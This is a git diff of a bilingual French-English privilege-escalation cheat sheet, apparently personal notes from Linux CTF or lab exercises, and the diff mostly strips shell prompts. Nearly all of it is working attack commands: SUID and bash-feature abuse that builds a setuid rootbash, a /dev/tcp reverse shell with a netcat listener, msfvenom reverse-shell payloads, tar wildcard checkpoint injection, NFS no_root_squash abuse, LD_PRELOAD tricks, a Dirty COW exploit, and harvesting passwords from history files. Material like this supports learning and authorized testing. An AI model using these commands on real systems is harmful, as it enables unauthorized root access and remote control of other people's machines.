@@ -1,8 +1,8 @@
 
 ### Scripts : 
-LinEnum -> comme LinPeas
-Enumerate privEsc factors
-linux-exploit-suggester.sh
+LinEnum -> comme LinPeas  
+Enumerate privEsc factors  
+linux-exploit-suggester.sh  
 
 ### Mettre LinEnum sur la machine cible :
 	- python3 -m http.server 8000 		-> Ouvre une serveur web python en local
@@ -13,11 +13,11 @@ linux-exploit-suggester.sh
 ### A la main :  
 ### ABUSING SUID FILES :  
 ```bash
-$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
 ```
 ou
 ```bash
-$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 then search suspect SUID in GTFOBINS
 
@@ -27,22 +27,24 @@ looking for the exploit in exploit-db.com or google ...
 
 
 ### ABUSING SHELL FEATURES : 
-context : The  executable is identical to /usr/local/bin/suid-env  
+***context :***
+
+The  executable is identical to /usr/local/bin/suid-env  
 except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
 ```bash
-$ /bin/bash --version -> verify the version is under 4.2-048
+/bin/bash --version -> verify the version is under 4.2-048
 ```
 ```bash
-$ function /usr/sbin/service { /bin/bash -p; }
-$ export -f /usr/sbin/service
-$ /usr/local/bin/suid-env2
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
 ```
 ### ABUSING SHELL FEATURE #2
 (will not work on bash version 4.4 and above)  
 (vuln with debugging bash enabled)  
 ```bash
-$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env
-$ /tmp/rootbash -p
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env
+/tmp/rootbash -p
 ```
 
 
@@ -50,11 +52,11 @@ $ /tmp/rootbash -p
 modifier le password du root / creer un nouvel account avec des perms root
 - create a new password hash : 
 ```bash
-$ openssl passwd -1 -salt [salt] [password]
+openssl passwd -1 -salt [salt] [password]
 ```
 ou
 ```bash
-ou juste : $ openssl passwd [newpassword]
+ou juste : openssl passwd [newpassword]
 ```
 
 ***FORMAT PASSWD :***
@@ -116,7 +118,7 @@ on écrit l'imitation du file et on setup un listener (en ayant remplacer l'ip e
 bash -i >& /dev/tcp/[Adresse IP]/4444 0>&1
 ```
 ```bash
-$ nc -lvnp 4444
+nc -lvnp 4444
 ```
 
 ##### ROOTBASH :
@@ -132,7 +134,7 @@ chmod +x /path/filename.sh
 ```
 wait for the cron job executing
 ```bash
-$ /tmp/rootbash -p
+/tmp/rootbash -p
 ```
 ##### OVERWRITING CRONS
 ```bash
@@ -150,22 +152,22 @@ on peut executer d'autres fichiers.
 donc :   
 ***quand on cat le fichier on lit blabla tar '*' :**
 ```bash
-$ cat /usr/local/bin/compress.sh
+cat /usr/local/bin/compress.sh
 ```
 REVERSE root SHELL
 on créee un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
 ```bash
-$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
-$ chmod +x /home/user/shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+chmod +x /home/user/shell.elf
 ```
 on cree des fichiers qui seront executés comme des <flag> de la commande tar
 ```bash
-$ touch /home/user/--checkpoint=1
-$ touch /home/user/--checkpoint-action=exec=shell.elf
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
 ```
 on setup un netcat et on attend
 ```
-$ nc -nvlp 4444
+nc -nvlp 4444
 ```
 
 #### ROOTBASH
@@ -188,7 +190,7 @@ echo $PATH
 ```
 On commence par cree le faux script
 ```bash
-$ cd /tmp
+cd /tmp
 $echo "[whatever command we want to run]" > [name of the executable we're imitating] 
 ```
 
@@ -203,9 +205,9 @@ et on réexecute le file
 
 ### MOT DE PASSE ACCIDENTELLEMENT TAPÉ :
 si un user à accidentellement tapé un mot de passe dans une vraie ligne :
-c'est rangé dans $ history ou :
+c'est rangé dans history ou :
 ```bash
-$ cat ~/.*history | less
+cat ~/.*history | less
 ```
 
 ### CONFIG FILES : (.ovpn par exemple)
@@ -221,19 +223,19 @@ ssh -i id_rsa username@ipaddress
 
 ### NFS root_squashing
 ```
-$ cat /etc/exports -> ici on avait trouvé no_root_squash
+cat /etc/exports -> ici on avait trouvé no_root_squash
 ```
 sur notre machine :
 on doit run en tant que root donc : 
 ```bash
-$ sudo su
-$ mkdir /tmp/nfs
-$ mount -o rw,vers=2 <targetIP>:/tmp /tmp/nfs
+sudo su
+mkdir /tmp/nfs
+mount -o rw,vers=2 <targetIP>:/tmp /tmp/nfs
 ```
 on crée un payload qui pop un simple bash
 ```bash
-$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
-$ chmod +x /tmp/nfs/shell.elf
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +x /tmp/nfs/shell.elf
 ```
 Sur la target :
 ```bash
@@ -264,7 +266,7 @@ sudo LD_PRELOAD=/tmp/x.so apache2
 ### SUID/SGID SHARED OBJECTS INJECTION
 ( On cherche les SUID qu'il manque pour les recreer )
 ```bash
-└─$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+└─strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
 ```
 From the output, notice that a .so file is missing from a writable directory.
 ***.so is compiled .c***
@@ -316,16 +318,16 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash &&
 
 ### KERNEL EXPLOIT :
 1 ) run the linux exploit suggester_pl   
-$ perl PATH/SCRIPT.PL  
+perl PATH/SCRIPT.PL  
 2 ) use the desired vuln : here dirty cow  
 compile :
 ```bash
-$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 ```
 run and let it finish : 
 ```
-$ ./c0w	
-$ /usr/bin/passwd	-> allow to gain te root shell
+./c0w	
+/usr/bin/passwd	-> allow to gain te root shell
 ```
 ### CAPABILITIES
 ```bash
@@ -362,15 +364,15 @@ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x
 
 ### SMB (139 445)
 ```bash
-$ enum4linux IP
-$ smbclient //IP//Share
+enum4linux IP
+smbclient //IP//Share
 ```
 
 
 ### FTP
 ***(anonymous login)***  
 writeable files ?
-$ get <filename>
+get <filename>
 
 ### WEB
 Look for commentary (even in default page)  
